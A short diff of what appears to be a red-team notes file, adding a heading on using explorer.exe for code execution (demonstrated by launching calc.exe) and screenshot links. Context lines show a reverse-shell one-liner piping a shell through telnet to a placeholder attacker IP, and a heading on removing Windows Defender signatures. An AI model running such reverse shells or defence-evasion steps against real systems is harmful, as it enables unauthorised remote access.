@@ -41,14 +41,16 @@ mkfifo /tmp/cth; sh -i 2>&1 </tmp/cth | telnet <atkIP> 8443 >/tmp/cth; rm /tmp/c
 ---
 
 ---
-
+## Explorer.exe for code Execution
 Example: using explorer.exe for code execution
 
 ```powershell
 
 explorer.exe /root,"C:\Windows\System32\calc.exe"
 ```
-
+![](assets/img/red-teams-notes/process-monitor-1.png)
+![](assets/img/red-teams-notes/process-monitor-2.png)
+![](assets/img/red-teams-notes/process-monitor-3.png)
 ---
 
 ## Windows Defender signature removoal  
